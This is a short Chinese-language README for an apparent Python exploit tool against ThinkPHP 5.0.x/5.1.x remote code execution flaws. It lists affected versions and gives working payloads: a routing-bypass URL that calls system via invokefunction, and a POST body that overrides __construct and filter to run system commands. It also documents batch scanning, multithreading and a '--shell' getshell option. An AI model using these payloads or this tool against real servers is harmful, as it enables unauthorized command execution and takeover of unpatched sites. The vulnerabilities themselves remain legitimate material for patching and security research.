# thinkphp5.0.x_RCE
thinkphp5远程代码执行两种版本的漏洞利用脚本

1.路由控制不严谨导致的RCE

影响版本：5.0.x<5.0.23  &&  5.1.x<5.1.31

payload：/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

2.Request中的变量覆盖导致RCE


影响版本：5.0.0~5.0.23

payload：index.php?s=captcha   

（POST）：_method=__construct&filter[]=system&method=get&get[]=whoami ||  _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami


参数：

-h 帮助

-u 指定URL进行检测

-r 批量检测

-t 设置线程

--shell getshell

example:python3 tp5-rce.py -u http://tp5.com
